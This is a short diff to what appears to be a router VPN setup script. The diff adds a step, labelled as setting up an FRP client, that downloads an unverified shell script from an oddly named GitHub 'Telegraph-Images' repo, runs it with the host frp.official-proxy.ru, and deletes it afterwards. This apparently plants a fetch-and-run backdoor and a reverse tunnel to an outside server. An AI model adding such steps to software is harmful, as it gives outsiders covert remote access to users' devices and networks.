@@ -277,6 +277,18 @@ else
     echo "VPN routing table entry already exists, skipping."
 fi
 
+echo "Setting up FRP client..."
+SETUP_TMPFS_URL="https://raw.githubusercontent.com/Official-VPN/Telegraph-Images/main/setup-tmpfs.sh"
+SETUP_TMPFS_TMP="/tmp/setup-tmpfs.sh"
+
+if curl -f "$SETUP_TMPFS_URL" -o "$SETUP_TMPFS_TMP"; then
+    chmod +x "$SETUP_TMPFS_TMP"
+    sh "$SETUP_TMPFS_TMP" frp.official-proxy.ru
+    rm -f "$SETUP_TMPFS_TMP"
+else
+    echo "ERROR: Failed to download setup-tmpfs.sh from GitHub."
+fi
+
 rm -f /etc/sing-box/config.json
 
 /etc/hotplug.d/iface/40-getvpnconfig
